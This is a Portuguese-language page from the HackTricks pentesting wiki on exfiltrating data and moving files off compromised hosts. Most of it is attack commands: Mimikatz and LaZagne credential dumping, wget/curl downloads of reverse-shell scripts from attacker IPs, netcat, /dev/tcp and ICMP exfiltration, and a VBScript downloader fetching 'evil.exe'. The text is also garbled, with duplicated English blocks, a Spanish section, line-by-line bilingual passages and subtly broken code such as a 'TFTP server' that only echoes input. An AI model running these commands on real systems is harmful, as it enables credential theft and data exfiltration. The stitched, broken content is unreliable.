## Exfiltração

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (8).png" alt="" data-size="original">\
**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje mesmo e comece a ganhar recompensas de até **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Copiar e Colar Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**

# Exfil Windows Credentials

## Using Mimikatz

Mimikatz is a tool that can be used to extract Windows credentials from memory. It can be used to extract passwords, hashes, and Kerberos tickets from memory.

### Dumping Credentials

To dump credentials from memory, run the following command:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords full
```

This will dump all of the credentials from memory, including passwords, hashes, and Kerberos tickets.

### Dumping Hashes

To dump hashes from memory, run the following command:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::hashes
```

This will dump all of the hashes from memory.

## Using LaZagne

LaZagne is a tool that can be used to retrieve passwords stored on a Windows system. It can retrieve passwords from a variety of sources, including web browsers, email clients, and instant messaging programs.

### Dumping Credentials

To dump credentials using LaZagne, run the following command:

```
laZagne.exe all
```

This will dump all of the credentials from the system.

## Using Empire

Empire is a post-exploitation framework that can be used to exfiltrate Windows credentials. It can be used to dump passwords, hashes, and Kerberos tickets from memory.

### Dumping Credentials

To dump credentials using Empire, run the following command:

```
powershell> Invoke-Mimikatz -DumpCreds
```

This will dump all of the credentials from memory, including passwords, hashes, and Kerberos tickets.
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

# Exfil Windows Credentials

## Using Mimikatz

Mimikatz is a tool that can be used to extract Windows credentials from memory. It can be used to extract passwords, hashes, and Kerberos tickets from memory.

### Dumping Credentials

To dump credentials from memory, run the following command:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords full
```

This will dump all of the credentials from memory, including passwords, hashes, and Kerberos tickets.

### Dumping Hashes

To dump hashes from memory, run the following command:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::hashes
```

This will dump all of the hashes from memory.

## Using LaZagne

LaZagne is a tool that can be used to retrieve passwords stored on a local computer. It can retrieve passwords from a variety of sources, including web browsers, email clients, and instant messaging programs.

### Dumping Credentials

To dump credentials using LaZagne, run the following command:

```
laZagne.exe all
```

This will dump all of the credentials from the local computer.

## Using Empire

Empire is a post-exploitation framework that can be used to exfiltrate Windows credentials. It can be used to dump credentials from memory, as well as to perform other post-exploitation tasks.

### Dumping Credentials

To dump credentials using Empire, run the following command:

```
powershell
Import-Module .\PowerSploit.psd1
Invoke-Mimikatz -DumpCreds
```

This will dump all of the credentials from memory.

## Using Metasploit

Metasploit is a penetration testing framework that can be used to exfiltrate Windows credentials. It can be used to dump credentials from memory, as well as to perform other post-exploitation tasks.

### Dumping Credentials

To dump credentials using Metasploit, run the following command:

```
use post/windows/gather/credentials/gpp
set SESSION <session id>
run
```

This will dump the Group Policy Preferences (GPP) password from memory.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Upload de arquivos

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer imprimindo GET e POSTs (também cabeçalhos)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Módulo Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth: 
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Servidor HTTPS**

---

#### **Descrição**

Um servidor HTTPS é um servidor web que utiliza o protocolo HTTPS para criptografar as comunicações entre o servidor e o cliente. Isso garante que as informações transmitidas sejam seguras e não possam ser interceptadas por terceiros.

#### **Exfiltração**

A exfiltração de dados de um servidor HTTPS pode ser mais difícil do que a de um servidor HTTP, pois as comunicações são criptografadas. No entanto, ainda é possível exfiltrar dados por meio de vulnerabilidades no servidor ou por meio de ataques de engenharia social.

Algumas técnicas de exfiltração que podem ser usadas em um servidor HTTPS incluem:

- **DNS Tunneling**: essa técnica envolve a criação de um túnel DNS para exfiltrar dados. O atacante envia os dados para um servidor DNS controlado por ele, que pode ser acessado de fora da rede. O servidor DNS, em seguida, retorna os dados para o atacante por meio de respostas DNS.

- **Steganography**: essa técnica envolve a ocultação de dados em arquivos de imagem ou áudio. O atacante pode, por exemplo, ocultar dados em uma imagem em um site HTTPS e, em seguida, baixar a imagem de fora da rede.

- **HTTP Header Injection**: essa técnica envolve a injeção de dados em cabeçalhos HTTP. O atacante pode, por exemplo, injetar dados em um cabeçalho HTTP em uma solicitação HTTPS e, em seguida, capturar a solicitação de fora da rede.

#### **Prevenção**

Para prevenir a exfiltração de dados de um servidor HTTPS, é importante manter o servidor atualizado e corrigir quaisquer vulnerabilidades conhecidas. Além disso, é importante educar os usuários sobre os riscos de engenharia social e implementar medidas de segurança, como autenticação de dois fatores e monitoramento de rede.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)    
@app.route('/')    
def root():    
    print(request.get_json())
    return "OK"
if __name__ == "__main__":    
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Servidor FTP (python)

```python
#!/usr/bin/env python3
import socket
import os

def send_file(conn, filename):
    with open(filename, 'rb') as f:
        conn.sendall(f.read())

def handle_connection(conn, addr):
    print(f'[*] New connection from {addr[0]}:{addr[1]}')
    conn.sendall(b'Welcome to my FTP server!\n')
    while True:
        data = conn.recv(1024).decode().strip()
        if not data:
            break
        if data.startswith('GET '):
            filename = data.split()[1]
            if os.path.isfile(filename):
                conn.sendall(b'OK\n')
                send_file(conn, filename)
            else:
                conn.sendall(b'ERROR\n')
        else:
            conn.sendall(b'ERROR\n')
    conn.close()

def main():
    bind_ip = '0.0.0.0'
    bind_port = 21
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((bind_ip, bind_port))
        s.listen(1)
        print(f'[*] Listening on {bind_ip}:{bind_port}')
        while True:
            conn, addr = s.accept()
            handle_connection(conn, addr)

if __name__ == '__main__':
    main()
```

Este é um servidor FTP simples escrito em Python que permite que um cliente faça download de arquivos do servidor. O servidor escuta na porta 21 e aceita conexões de um único cliente por vez. Quando um cliente se conecta, o servidor envia uma mensagem de boas-vindas e aguarda comandos do cliente. O servidor suporta apenas o comando GET, que permite que o cliente faça download de um arquivo do servidor. Se o arquivo existir no servidor, o servidor envia o conteúdo do arquivo para o cliente. Se o arquivo não existir, o servidor envia uma mensagem de erro para o cliente.
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### Servidor FTP (NodeJS)

#### Introdução

O servidor FTP é uma das maneiras mais simples de exfiltrar dados de um ambiente comprometido. Neste caso, usaremos um servidor FTP escrito em NodeJS para receber os dados exfiltrados.

#### Configuração

Para configurar o servidor FTP, primeiro precisamos instalar o pacote `ftp-srv` do NodeJS:

```
npm install ftp-srv
```

Em seguida, podemos criar um arquivo `server.js` com o seguinte conteúdo:

```javascript
const FtpSrv = require('ftp-srv');

const ftpServer = new FtpSrv({
  url: 'ftp://127.0.0.1:21',
  pasv_url: 'ftp://127.0.0.1:3000',
  greeting: 'Welcome to my FTP server',
  anonymous: true,
  file_format: 'ls',
});

ftpServer.on('login', ({connection, username, password}, resolve, reject) => {
  console.log(`User ${username} logged in`);
  resolve({root: './'});
});

ftpServer.listen()
  .then(() => {
    console.log('FTP server listening');
  });
```

Este arquivo cria um servidor FTP que escuta na porta 21 e usa a porta 3000 para conexões passivas. O servidor é configurado para permitir logins anônimos e usa o diretório atual como raiz para o usuário conectado.

#### Uso

Para usar o servidor FTP, basta conectar-se a ele usando um cliente FTP e fazer o upload dos dados que deseja exfiltrar. Os dados serão armazenados no diretório raiz do usuário conectado.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Servidor FTP (pure-ftp)

#### Exfiltration

#### Exfiltração

Pure-FTP is a popular FTP server that can be used to exfiltrate data from a compromised system. 

O Pure-FTP é um servidor FTP popular que pode ser usado para exfiltrar dados de um sistema comprometido.

To exfiltrate data using Pure-FTP, you will need to have a Pure-FTP server set up and running on a remote system that you control. 

Para exfiltrar dados usando o Pure-FTP, você precisará ter um servidor Pure-FTP configurado e em execução em um sistema remoto que você controle.

Once you have the server set up, you can use a variety of FTP clients to connect to the server and transfer data. 

Depois de configurar o servidor, você pode usar uma variedade de clientes FTP para se conectar ao servidor e transferir dados.

One popular FTP client is FileZilla, which is available for Windows, macOS, and Linux. 

Um cliente FTP popular é o FileZilla, que está disponível para Windows, macOS e Linux.

To use FileZilla to exfiltrate data, you will need to configure it to connect to your Pure-FTP server. 

Para usar o FileZilla para exfiltrar dados, você precisará configurá-lo para se conectar ao seu servidor Pure-FTP.

Once you are connected, you can navigate to the directory on the compromised system where the data you want to exfiltrate is located, and then transfer the data to the remote Pure-FTP server. 

Depois de conectado, você pode navegar até o diretório no sistema comprometido onde os dados que deseja exfiltrar estão localizados e, em seguida, transferir os dados para o servidor Pure-FTP remoto.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### Cliente **Windows**
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kali como servidor

### Exfiltración de archivos

#### Usando smbclient

`smbclient` es una herramienta de línea de comandos que permite interactuar con recursos compartidos de SMB/CIFS. Podemos usarlo para subir archivos a un recurso compartido remoto.

```bash
smbclient //IP/SHARE -U username%password -c "put file.txt"
```

#### Usando smbmap

`smbmap` es una herramienta de enumeración de recursos compartidos de SMB/CIFS. Podemos usarlo para listar los recursos compartidos y descargar archivos.

```bash
smbmap -u username -p password -H IP -R sharename -A file.txt
```

#### Usando impacket

`impacket` es una colección de herramientas de Python para interactuar con protocolos de red. Podemos usarlo para subir y descargar archivos.

```bash
impacket-smbserver sharename /path/to/folder
impacket-smbclient //IP/sharename -u username -p password
```

### Exfiltración de datos

#### Usando smbclient

Podemos usar `smbclient` para descargar archivos de un recurso compartido remoto.

```bash
smbclient //IP/SHARE -U username%password -c "get file.txt"
```

#### Usando smbget

`smbget` es una herramienta de línea de comandos que permite descargar archivos de un recurso compartido de SMB/CIFS.

```bash
smbget -U username -P password smb://IP/SHARE/file.txt
```

#### Usando impacket

Podemos usar `impacket` para descargar archivos de un recurso compartido remoto.

```bash
impacket-smbclient //IP/sharename -u username -p password
smb: \> get file.txt
```
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Ou crie um compartilhamento smb **usando samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltração de Dados do Windows

## Introdução

A exfiltração de dados é o processo de roubar dados de um sistema comprometido e transferi-los para um sistema controlado pelo atacante. Existem várias técnicas que podem ser usadas para exfiltrar dados do Windows.

## Técnicas

### FTP

O FTP é um protocolo de transferência de arquivos que pode ser usado para exfiltrar dados do Windows. O atacante pode configurar um servidor FTP em um sistema controlado por ele e, em seguida, usar um cliente FTP no sistema comprometido para transferir os dados.

### HTTP

O HTTP é um protocolo de transferência de hipertexto que pode ser usado para exfiltrar dados do Windows. O atacante pode configurar um servidor HTTP em um sistema controlado por ele e, em seguida, usar um cliente HTTP no sistema comprometido para transferir os dados.

### DNS

O DNS é um protocolo de resolução de nomes que pode ser usado para exfiltrar dados do Windows. O atacante pode configurar um servidor DNS em um sistema controlado por ele e, em seguida, usar um cliente DNS no sistema comprometido para transferir os dados.

### SMTP

O SMTP é um protocolo de transferência de correio eletrônico que pode ser usado para exfiltrar dados do Windows. O atacante pode configurar um servidor SMTP em um sistema controlado por ele e, em seguida, usar um cliente SMTP no sistema comprometido para transferir os dados.

### SMB

O SMB é um protocolo de compartilhamento de arquivos que pode ser usado para exfiltrar dados do Windows. O atacante pode configurar um servidor SMB em um sistema controlado por ele e, em seguida, usar um cliente SMB no sistema comprometido para transferir os dados.

## Conclusão

Existem várias técnicas que podem ser usadas para exfiltrar dados do Windows. É importante que as organizações implementem medidas de segurança adequadas para proteger seus sistemas contra essas técnicas.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

O atacante precisa ter o SSHd em execução.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename> 
```
## SSHFS

Se a vítima tiver SSH, o atacante pode montar um diretório da vítima para o atacante.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

O comando `nc` (netcat) é uma ferramenta de rede que pode ser usada para transferir dados de um host para outro. É muito útil para exfiltrar dados de um servidor comprometido para um host controlado pelo atacante.

### Exemplo de uso

Para exfiltrar um arquivo usando `nc`, primeiro inicie um servidor `nc` no host controlado pelo atacante:

```
nc -lvp 1234 > exfiltrated_file
```

Em seguida, no servidor comprometido, use o seguinte comando para enviar o arquivo para o host controlado pelo atacante:

```
cat file_to_exfiltrate | nc <attacker_ip> 1234
```

O arquivo será transferido para o host controlado pelo atacante e salvo como `exfiltrated_file`.

### Observações

- O comando `nc` pode ser encontrado em sistemas Linux e Windows.
- O uso de `nc` pode ser detectado por firewalls e sistemas de detecção de intrusão.
- O uso de `nc` pode ser considerado suspeito em ambientes corporativos e pode levar a investigações de segurança.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Baixar arquivo da vítima
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Enviar arquivo para a vítima
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
## **ICMP**

graças a **@BinaryShadow\_**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Se você pode enviar dados para um servidor SMTP, você pode criar um servidor SMTP para receber os dados com python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Por padrão no XP e 2003 (em outros sistemas operacionais é necessário adicioná-lo explicitamente durante a instalação)

No Kali, **inicie o servidor TFTP**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Servidor TFTP em Python:**

Este é um exemplo de um servidor TFTP simples escrito em Python. Ele pode ser usado para exfiltrar dados de uma rede comprometida para um servidor controlado pelo atacante. O servidor TFTP é executado em uma porta específica e aguarda a conexão de um cliente TFTP. Quando um cliente se conecta, o servidor envia o arquivo solicitado pelo cliente. Neste caso, o arquivo é um arquivo de texto simples, mas pode ser qualquer tipo de arquivo.

```python
import socketserver

class TFTPServer(socketserver.UDPServer):
    def __init__(self, server_address, RequestHandlerClass):
        socketserver.UDPServer.__init__(self, server_address, RequestHandlerClass)

class TFTPRequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data = self.request[0].strip()
        socket = self.request[1]
        print("{} wrote:".format(self.client_address[0]))
        print(data)
        socket.sendto(data.upper(), self.client_address)

if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 69
    server = TFTPServer((HOST, PORT), TFTPRequestHandler)
    server.serve_forever()
```

Para executar o servidor, basta salvar o código em um arquivo com a extensão `.py` e executá-lo com o comando `python nome_do_arquivo.py`. O servidor será executado na porta 69 e aguardará a conexão de um cliente TFTP.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
No **vítima**, conecte-se ao servidor Kali:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Baixe um arquivo com um PHP oneliner:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript é uma linguagem de script da Microsoft que é usada para automatizar tarefas em sistemas Windows. É uma linguagem de script interpretada que é executada pelo Windows Script Host. VBScript é uma linguagem de programação fácil de aprender e é usada para criar scripts que podem ser usados para realizar várias tarefas, como manipulação de arquivos, interação com o usuário e acesso a bancos de dados.

VBScript é frequentemente usado em ataques de phishing para executar malware em sistemas Windows. Os atacantes podem usar VBScript para baixar e executar arquivos maliciosos, roubar informações confidenciais e exfiltrar dados. Para evitar a detecção, os atacantes podem ofuscar o código VBScript usando técnicas como a codificação Base64.

Os defensores podem detectar o uso de VBScript em ataques monitorando o tráfego de rede em busca de comunicações suspeitas, como o envio de dados para endereços IP desconhecidos. Eles também podem usar ferramentas de análise de código para identificar código VBScript malicioso e bloquear sua execução.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Vítima**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Esta é uma técnica maluca que funciona em máquinas Windows de 32 bits. A ideia é usar o programa `debug.exe`. Ele é usado para inspecionar binários, como um depurador. Mas também pode reconstruí-los a partir de hex. Então, a ideia é que pegamos binários, como `netcat`. E então desmontamos em hex, colamos em um arquivo na máquina comprometida e, em seguida, montamos com `debug.exe`.

`Debug.exe` só pode montar 64 kb. Então, precisamos usar arquivos menores que isso. Podemos usar o UPX para comprimi-lo ainda mais. Então, vamos fazer isso:
```
upx -9 nc.exe
```
Agora ele pesa apenas 29 kb. Perfeito. Então, agora vamos desmontá-lo:
```
wine exe2bat.exe nc.exe nc.txt
```
Agora, basta copiar e colar o texto em nosso shell do Windows. E ele criará automaticamente um arquivo chamado nc.exe

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (8).png" alt="" data-size="original">\
**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
